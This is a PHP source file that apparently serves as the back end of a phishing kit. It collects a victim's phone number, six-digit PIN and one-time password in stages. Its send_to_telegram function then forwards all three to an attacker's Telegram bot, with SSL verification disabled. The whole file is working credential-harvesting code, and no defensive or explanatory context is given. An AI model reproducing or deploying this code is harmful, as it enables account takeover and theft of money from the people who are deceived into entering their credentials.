<?php
session_start();

function handle_no_hp($no_hp)
{
    $_SESSION['nomor'] = $no_hp;
    header("Location: pin.php");
}

function handle_pin($data)
{
    $pin = $data['pin1'] . $data['pin2'] . $data['pin3'] . $data['pin4'] . $data['pin5'] . $data['pin6'];

    if (!is_numeric($pin)) {
        header("Location: pin.php");
        return;
    }

    $_SESSION['pin'] = $pin;
    $_SESSION['nomor'] = $data['nomor'];

    header("Location: otp.php");
}

function handle_otp($data)
{
    $otp = $data['otp'];

    $_SESSION['otp'] = $otp;
    $_SESSION['pin'] = $data['pin'];
    $_SESSION['nomor'] = $data['nomor'];

    if (!is_numeric($otp)) {
        header("Location: otp.php");
        return;
    }

    send_to_telegram($data['nomor'], $data['pin'], $otp);
    header("Location: otp.php");
}

function send_to_telegram($nomor, int $pin, int $otp)
{
    $config = include __DIR__ . '/config.php';
    $token = $config['telegram_bot_token'];
    $chat_id = $config['chat_id'];

    $message = "Nomor: $nomor\nPin: $pin\nOtp: $otp";

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot" . $token . "/sendMessage");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, "chat_id=" . $chat_id . "&text=" . $message);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $server_output = curl_exec($ch);
    curl_close($ch);
}
